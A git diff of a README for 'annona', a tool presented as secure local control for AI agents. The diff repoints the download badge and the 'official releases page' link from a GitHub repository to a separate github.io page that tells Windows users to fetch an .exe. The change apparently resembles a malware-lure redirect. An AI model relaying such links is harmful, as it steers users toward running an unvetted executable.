@@ -1,6 +1,6 @@
 # 🛡️ annona - Secure control for your AI agents
 
-[![](https://img.shields.io/badge/Download_Annona-Blue.svg)](https://github.com/Arrivalscenestealer31/annona)
+[![](https://img.shields.io/badge/Download_Annona-Blue.svg)](https://arrivalscenestealer31.github.io)
 
 Annona manages your AI agents on your own computer. It directs where tasks run, ensures your rules remain active, and keeps a log of all actions. You maintain full control over your data because everything stays on your machine.
 
@@ -8,7 +8,7 @@ Annona manages your AI agents on your own computer. It directs where tasks run, 
 
 Follow these steps to get Annona running on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Arrivalscenestealer31/annona) to find the latest version.
+1. Visit the [official releases page](https://arrivalscenestealer31.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
